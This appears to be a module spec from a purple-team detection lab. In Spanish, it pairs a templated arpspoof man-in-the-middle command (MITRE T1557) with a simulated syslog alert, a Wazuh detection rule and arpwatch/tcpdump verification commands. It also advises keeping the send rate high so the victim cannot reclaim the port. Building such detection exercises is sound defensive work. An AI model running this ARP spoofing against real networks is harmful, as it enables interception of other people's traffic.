# MOD02 — Switch Port Stealing
ID: LAN-002 | MITRE: T1557 | Wazuh Rule: 100501 | Risk: HIGH

## Comando (INMUTABLE)
sudo arpspoof -i {{interface}} {{target_ip}}

## Parámetros
| name       | type | default | required |
|------------|------|---------|----------|
| interface  | text | eth0    | true     |
| target_ip  | text | ""      | true     |

## Logger (INMUTABLE)
logger -t CyberShield -p local0.alert "SEC_VIOLATION: Switch Port Stealing detected targeting {{target_ip}} on Interface {{interface}} - MITRE:T1557"

## Regla Wazuh (INMUTABLE)
<rule id="100501" level="12">
  <if_sid>1002</if_sid>
  <match>SEC_VIOLATION: Switch Port Stealing</match>
  <description>ALERTA CYBERSHIELD: Robo de puerto de switch detectado</description>
  <mitre><id>T1557</id></mitre>
</rule>

## Nota crítica
Requiere misma subred Capa 2. La víctima puede recuperar el puerto
si envía tráfico. Mantener tasa de envío alta.

## Verificación en Kali (ejecutar en paralelo al ataque)
```bash
sudo arpwatch -i eth0 2>&1 | tail -5
sudo tcpdump -i eth0 arp 2>/dev/null | head -10
```